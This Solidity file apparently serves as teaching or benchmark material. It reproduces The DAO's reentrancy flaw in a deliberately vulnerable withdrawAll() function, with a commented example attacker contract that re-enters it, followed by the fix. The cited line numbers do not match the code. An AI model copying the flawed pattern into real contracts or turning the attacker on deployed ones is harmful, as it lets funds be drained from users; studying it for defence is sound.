// SPDX-License-Identifier: MIT
pragma solidity ^0.4.19;

/**
 * @title The DAO - Classic Reentrancy Vulnerability
 * @notice This contract demonstrates the vulnerability that led to The DAO hack
 * @dev June 17, 2016 - The most famous smart contract hack in history
 *
 * VULNERABILITY: Classic reentrancy attack
 *
 * ROOT CAUSE:
 * The withdrawAll() function sends ETH to the caller BEFORE updating their balance.
 * This allows a malicious contract to re-enter the withdrawAll() function during
 * the external call, withdrawing funds multiple times before the balance is set to zero.
 *
 * ATTACK VECTOR:
 * 1. Attacker deposits ETH into the contract
 * 2. Attacker calls withdrawAll() from a malicious contract
 * 3. Contract sends ETH to attacker via call.value()
 * 4. Attacker's fallback function is triggered, which calls withdrawAll() again
 * 5. Since balance hasn't been updated yet, attacker withdraws again
 * 6. Steps 3-5 repeat until contract is drained or gas runs out
 *
 * The vulnerability allowed the attacker to drain 3.6M ETH (~$60M at the time).
 * This led to Ethereum's controversial hard fork into ETH and ETC.
 */
contract VulnerableDAO {
    mapping(address => uint256) public credit;
    uint256 public balance;

    /**
     * @notice Deposit ETH into the contract
     */
    function deposit() public payable {
        credit[msg.sender] += msg.value;
        balance += msg.value;
    }

    /**
     * @notice Withdraw all credited ETH
     * 
     * VULNERABILITY IS HERE:
     * The function follows the pattern:
     * 1. Check balance (line 49)
     * 2. Send ETH (line 51) <- EXTERNAL CALL
     * 3. Update state (line 53) <- TOO LATE!
     *
     * This is a textbook "checks-effects-interactions" violation.
     * State should be updated BEFORE external calls.
     */
    function withdrawAll() public {
        uint256 oCredit = credit[msg.sender];
        if (oCredit > 0) {
            balance -= oCredit;
            // VULNERABLE LINE: External call before state update
            bool callResult = msg.sender.call.value(oCredit)();
            require(callResult);
            credit[msg.sender] = 0;  // This happens too late!
        }
    }

    /**
     * @notice Get credited amount for an address
     */
    function getCredit(address user) public view returns (uint256) {
        return credit[user];
    }
}

/**
 * Example attack contract:
 *
 * contract DAOAttacker {
 *     VulnerableDAO public dao;
 *     uint256 public iterations = 0;
 *     
 *     constructor(address _dao) {
 *         dao = VulnerableDAO(_dao);
 *     }
 *     
 *     function attack() public payable {
 *         dao.deposit.value(msg.value)();
 *         dao.withdrawAll();
 *     }
 *     
 *     function() public payable {
 *         iterations++;
 *         if (iterations < 10 && address(dao).balance > 0) {
 *             dao.withdrawAll();  // Reenter!
 *         }
 *     }
 * }
 *
 * REAL-WORLD IMPACT:
 * - 3.6M ETH stolen (~$60M in 2016, worth billions today)
 * - Led to Ethereum hard fork (ETH/ETC split)
 * - Changed smart contract development practices forever
 * - Introduced the "checks-effects-interactions" pattern as standard
 *
 * FIX:
 * Move the state update BEFORE the external call:
 *
 * function withdrawAll() public {
 *     uint256 oCredit = credit[msg.sender];
 *     if (oCredit > 0) {
 *         balance -= oCredit;
 *         credit[msg.sender] = 0;  // Update state FIRST
 *         bool callResult = msg.sender.call.value(oCredit)();  // Then call
 *         require(callResult);
 *     }
 * }
 *
 * Or use ReentrancyGuard modifier from OpenZeppelin.
 *
 * VULNERABLE LINES:
 * - Line 51: External call to msg.sender before state update
 * - Line 53: Balance update happens after external call (reentrancy window)
 *
 * KEY LESSON:
 * Always update internal state BEFORE making external calls.
 * This is the foundation of secure smart contract development.
 */
